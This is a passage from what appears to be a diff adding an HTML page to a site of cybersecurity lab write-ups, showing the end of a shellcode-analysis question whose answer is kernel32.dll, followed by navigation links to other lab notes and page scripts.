shellcode used a specific technique to determine its location in memory. What is the OS file being queried during this process?</a><a href="#kernel32.dll">kernel32.dll</a></details>
+    </div>
+    
+    <footer class="pager"><a href="poisonedcredentials-cyberdefenders.html">← PoisonedCredentials (Cyberdefenders)</a><a href="warzone-1-thm.html">Warzone 1 (THM) →</a></footer></main>
+  </div>
+  <div class="lightbox" id="lightbox" hidden><button type="button" aria-label="Close image">×</button><img alt=""></div>
+  <div class="command-palette" id="commandPalette" hidden>
+    <div class="command-panel">
+      <div class="command-head"><strong>Quick jump</strong><button type="button" id="closeCommand">Close</button></div>
+      <input id="commandInput" type="search" placeholder="Search any note, tag, command, or MITRE ID">
+      <div id="commandResults" class="command-results"></div>
+    </div>
+  </div>
+  <script src="../data/json/search-index.js"></script>
+  <script src="../script.js"></script>
+</body>
+</html>
